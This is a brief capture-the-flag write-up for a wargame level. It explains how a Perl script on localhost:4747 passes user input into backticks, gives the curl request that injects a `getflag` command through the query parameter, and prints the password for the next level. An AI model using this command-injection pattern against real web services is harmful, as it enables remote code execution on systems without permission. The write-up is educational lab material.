Reading the perl script, we can see `localhost:4747`.
So we may think that there is a script running at this address.
Furthermore, in the script, the line "print `echo $y 2>&1`".
If we run "./level04.pl x=`ls -l`" it will run the command ls.
Because of that, we tried to connect to localhost:4747 passing `getflag` as `x`:
curl 'localhost:4747/?x=`getflag`'
```
su level05
ne2searoevaevoem4ov4ar8ap
```
